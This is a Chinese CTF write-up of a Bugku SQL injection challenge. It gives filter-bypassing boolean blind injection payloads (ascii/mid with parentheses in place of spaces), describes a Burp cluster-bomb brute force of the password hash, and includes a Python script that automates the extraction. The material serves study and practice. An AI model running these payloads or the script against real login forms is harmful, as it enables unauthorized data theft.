---
author: "Yiming Shen"
date: 2021-10-24
lastmod: 2021-11-6
title: "Bugku-SQL注入-WriteUP"
tags: [
    "CTF",
    "WriteUP",
    "Web",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
math: true
typora-root-url: ..\..\..\..\static\
---



题目网址：[sql注入](https://ctf.bugku.com/challenges/detail/id/112.html?page=1)

![image-20211014221914790](/4.Bugku-SQL注入.assets/image-20211014221914790.png)

一个很正经的界面，有实战那味了。

![image-20211014222010532](/4.Bugku-SQL注入.assets/image-20211014222010532.png)

上来先尝试经典组合：

`admin~password`

很幸运，用户名猜中了。

利用单引号检测是否存在SQL注入

`admin' or 1 = 1`

![image-20211014222135986](/4.Bugku-SQL注入.assets/image-20211014222135986.png)

报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：

```
'
or
<>(不等号)
#
()
```

空格可用括号代替，等号可用相反的不等号

先尝试是否存在布尔注入：

![image-20211014222551824](/4.Bugku-SQL注入.assets/image-20211014222551824.png)

成功，用户名存在注入~

之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）

```mysql
select password from admin
```

因为屏蔽了逗号，所以`left、substr、if`函数基本无法使用，我们用`ascii`和`mid`函数构造payload

```mysql
1'or((ascii(mid((select(password)from(admin))from(1))))<>9)or(1)#
```

使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难

![image-20211014225952174](4.Bugku-SQL注入.assets/image-20211014225952174.png)

![image-20211014225933951](/4.Bugku-SQL注入.assets/image-20211014225933951.png)

我们尝试下集束炸弹，让两个参数都作为目标

第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码

![image-20211014230625824](/4.Bugku-SQL注入.assets/image-20211014230625824.png)

爆破成功了。。。

接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：

`4dcc88f8f1bc05e7c2ad1a60288481a2`

去md5破解站破解一下，成功解出密码：

`bugkuctf`

![image-20211014230833058](/4.Bugku-SQL注入.assets/image-20211014230833058.png)

结束了……

## 反思

自动化程度不够高，学的python要用上，不要有脚本小子思想。

贴一组大神的python自动脚本，以供学习

```python
#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。
import requests
import string,hashlib
url = 'http://114.67.246.176:19665/'
sss = string.digits + (string.ascii_lowercase)
a = ''
for i in range(1, 50):
    flag = 0
    for j in sss:
        payload = "admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#" % (i, ord(j))
        #屏蔽了","，改用mid()函数，from表示起始位置
        #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit
        #<>表示不等号
        #^表示异或
        payload2= "admin123'or((ascii(mid((select(password)from(admin))from(%s))))<>%s)#"%(i,ord(j))
        #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔
        payload3= "admin123'or((ascii(mid((select(database()))from(%s))))<>%s)#"%(i,ord(j))
        
        data = {'username': payload, 'password': 'admin'}
        res = requests.post(url, data=data).text
        if 'username does not exist!' in res:
            a += j
            flag = 1
            print(a)
            break
    if flag == 0:
        break
 
print(a)
```



## 参考题解

[1] [Bugku_sqli write up](https://blog.csdn.net/bin789456/article/details/119851596)
